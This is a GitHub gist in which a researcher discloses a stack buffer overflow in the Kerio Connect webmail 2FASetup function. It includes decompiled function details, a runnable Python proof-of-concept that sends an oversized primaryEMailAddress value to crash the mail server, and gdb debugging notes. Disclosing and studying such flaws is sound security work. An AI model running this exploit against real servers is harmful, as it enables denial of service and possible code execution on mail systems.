=== Content from gist.github.com_955b6b26_20250115_082958.html ===

[Skip to content](#start-of-content)

[All gists](/discover)
[Back to GitHub](https://github.com)
[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599)
[Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599&source=header-gist)

[Sign in](https://gist.github.com/auth/github?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599) [Sign up](/join?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599&source=header-gist)

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

Instantly share code, notes, and snippets.

[![@Frycos](https://avatars.githubusercontent.com/u/20755282?s=64&v=4)](/Frycos)

# [Frycos](/Frycos)/**[kerioconnectPoC.md](/Frycos/62fa664bacd19a85235be19c6e4d7599)**

Created
January 31, 2023 07:57

Show Gist options

* [Download ZIP](/Frycos/62fa664bacd19a85235be19c6e4d7599/archive/22bbca790f501807d999ad99b83c1cf54924c20e.zip)

* [Star
  (2)
  2](/login?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599)You must be signed in to star a gist
* [Fork
  (1)
  1](/login?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599)You must be signed in to fork a gist

* Embed

  + Embed
     Embed this gist in your website.
  + Share
     Copy sharable link for this gist.
  + Clone via HTTPS
     Clone using the web URL.
  + [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

  Clone this repository at &lt;script src=&quot;https://gist.github.com/Frycos/62fa664bacd19a85235be19c6e4d7599.js&quot;&gt;&lt;/script&gt;
* Save Frycos/62fa664bacd19a85235be19c6e4d7599 to your computer and use it in GitHub Desktop.

[Code](/Frycos/62fa664bacd19a85235be19c6e4d7599)
[Revisions
1](/Frycos/62fa664bacd19a85235be19c6e4d7599/revisions)
[Stars
2](/Frycos/62fa664bacd19a85235be19c6e4d7599/stargazers)
[Forks
1](/Frycos/62fa664bacd19a85235be19c6e4d7599/forks)

Embed

* Embed
   Embed this gist in your website.
* Share
   Copy sharable link for this gist.
* Clone via HTTPS
   Clone using the web URL.
* [Learn more about clone URLs](https://docs.github.com/articles/which-remote-url-should-i-use)

Clone this repository at &lt;script src=&quot;https://gist.github.com/Frycos/62fa664bacd19a85235be19c6e4d7599.js&quot;&gt;&lt;/script&gt;

Save Frycos/62fa664bacd19a85235be19c6e4d7599 to your computer and use it in GitHub Desktop.

[Download ZIP](/Frycos/62fa664bacd19a85235be19c6e4d7599/archive/22bbca790f501807d999ad99b83c1cf54924c20e.zip)

 [Raw](/Frycos/62fa664bacd19a85235be19c6e4d7599/raw/22bbca790f501807d999ad99b83c1cf54924c20e/kerioconnectPoC.md)

[**kerioconnectPoC.md**](#file-kerioconnectpoc-md)

# Kerio Connect - Stack Buffer Overflow in 2FASetup

[![@Frycos](https://avatars.githubusercontent.com/u/20755282?s=80&v=4)](/Frycos)

Copy link

Author

### **[Frycos](/Frycos)** commented [Jan 31, 2023](/Frycos/62fa664bacd19a85235be19c6e4d7599?permalink_comment_id=4454308#gistcomment-4454308) • edited Loading

## Introduction

The latest version **9.4.1 patch 1 (6445)** of the software **Kerio Connect** is prone to a **Stack Buffer Overflow** located in the webmail component **2FASetup** function. This attack could be conducted by **any unprivileged authenticated webmail user**.

[![kerio1](https://user-images.githubusercontent.com/20755282/215700728-4a37bb67-bce6-4478-a45e-66ade900146e.png)](https://user-images.githubusercontent.com/20755282/215700728-4a37bb67-bce6-4478-a45e-66ade900146e.png)

## Details

The function `bool kerio::mailserver::dataSwitch::TwoFAPolicyManSwitch::doSubmitDomainUserTwoFA(basic_string *param_1,basic_string,*param_2,basic_string *param_3,basic_string *param_4,ulong param_5,int *param_6,short *param_7,short,*param_8,bool param_9,basic_string *param_10)` makes use of an unsafe **strcpy(dest,src)** call with **user-controlled input**.

[![kerio2](https://user-images.githubusercontent.com/20755282/215700821-36f2eaa7-eb40-49c6-b667-7a1915535cd4.png)](https://user-images.githubusercontent.com/20755282/215700821-36f2eaa7-eb40-49c6-b667-7a1915535cd4.png)

The destination buffer is defined with a fixed size `char local_1c3 [128]` and gets filled with the user-controlled `param_4` buffer as source. Tracing back the input goes to the function `kerio::mailserver::dataSwitch::TwoFAPolicyManSwitch::submitTwoFA (basic_string *param_1,basic_string *param_2,basic_string *param_3,int *param_4,short *param_5,basic_string *param_6,int *param_7)` with `param_3`. The same parameter name comes from the caller `kerio::mailserver::facades::webmail::SessionManFacade::submitUserTwoFA(SessionManFacade *this,TwoFAAuthenticationStatus *param_1,short *param_2,basic_string *param_3,basic_string *param_4,basic_string *param_5)`.

The code is called by triggering the **2FASetup** in the webmail application running on TCP port 80 as **normal user**, i.e. no administrative permissions are needed. The 2FASetup is seen commonly enabled to further secure the login procedure against threat actors trying to get access to a mailbox if credentials were leaked.

[![kerio3](https://user-images.githubusercontent.com/20755282/215700890-58abbfcc-940c-4326-a3c7-2006e6bd7b9e.png)](https://user-images.githubusercontent.com/20755282/215700890-58abbfcc-940c-4326-a3c7-2006e6bd7b9e.png)

When the user starts the 2FASetup

[![kerio4](https://user-images.githubusercontent.com/20755282/215700947-1d840bce-a4d3-4854-b9f4-441f4b342d54.png)](https://user-images.githubusercontent.com/20755282/215700947-1d840bce-a4d3-4854-b9f4-441f4b342d54.png)

[![kerio5](https://user-images.githubusercontent.com/20755282/215700967-0304e7e1-138a-4d91-820f-8972bad5d7f4.png)](https://user-images.githubusercontent.com/20755282/215700967-0304e7e1-138a-4d91-820f-8972bad5d7f4.png)

a request to the server with the parameters `token` and `primaryEMailAddress` is sent.

[![kerio6](https://user-images.githubusercontent.com/20755282/215701015-f86b0abb-fb55-4b9c-9e5c-3f370dd8c683.png)](https://user-images.githubusercontent.com/20755282/215701015-f86b0abb-fb55-4b9c-9e5c-3f370dd8c683.png)

This request gets processed by the vulnerable code path mentioned above.

## Proof-of-concept Exploitation

To prove that the vulnerable **strcpy** indeed is filled by user-controlled data from these parameters, a proof-of-concept exploit in Python script was written.

```
import requests
import sys

if(len(sys.argv) < 3):
	print("usage: python poc.py <SESSION_CONNECT_WEBMAIL> <TOKEN_CONNECT_WEBMAIL>(=<X-Token>)")
	sys.exit()

session = requests.session()

burp0_url = "http://localhost:80/webmail/api/jsonrpc/"
burp0_cookies = {"SESSION_CONNECT_WEBMAIL": sys.argv[1], "TOKEN_CONNECT_WEBMAIL": sys.argv[2]}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0", "Accept": "application/json-rpc", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json", "X-Token": sys.argv[2], "X-Requested-With": "XMLHttpRequest", "Origin": "http://localhost", "Connection": "close", "Referer": "http://localhost/webmail/", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin"}
nicestring = '\xb2\x5f\xa3\x02' #02a35fb2
shell = "A"*383 + nicestring + "B"*100
payload = '{\"id\": 16, \"jsonrpc\": \"2.0\", \"method\": \"Session.submitUserTwoFA\", \"params\": {\"primaryEMailAddress\": ' + '\"' +  shell + '\"' + ', "token": "123456"}}'
session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=payload)
print("Payload send...")
```

The GNU debugger `gdb` (with *gef* extension) is used to debug the running binary `/opt/kerio/mailserver/mailserver /opt/kerio/mailserver`. A breakpoint at the vulnerable **strcpy** call is made at `0x0130f947`.

Then the Python script with the cookie values fed into the parameters is called `poc_sent.py 662a37f6e6fd2ed91307b8ce13998111ccf3a1b653b0cf58b22eaab8967f1103 a1d4229ded44eb257a58a4a99b3437ee0f1a19a563828c8ab9158ae0112b88db`.

The breakpoint indeed is hit.

[![kerio7](https://user-images.githubusercontent.com/20755282/215701193-627ace6e-63ea-4e21-bdda-a4e31712107f.png)](https://user-images.githubusercontent.com/20755282/215701193-627ace6e-63ea-4e21-bdda-a4e31712107f.png)

Due to the **stack buffer overflow** overwriting several other stack variables, the `mailserver` binary crashes and is (or has to be) restarted.

[![kerio8](https://user-images.githubusercontent.com/20755282/215701255-04cf42cc-54e0-47ed-9339-def77eea0b7a.png)](https://user-images.githubusercontent.com/20755282/215701255-04cf42cc-54e0-47ed-9339-def77eea0b7a.png)

# Patch

Version **10.0.0** fixed this issue properly.

Sorry, something went wrong.

[Sign up for free](/join?source=comment-gist)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgist.github.com%2FFrycos%2F62fa664bacd19a85235be19c6e4d7599)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


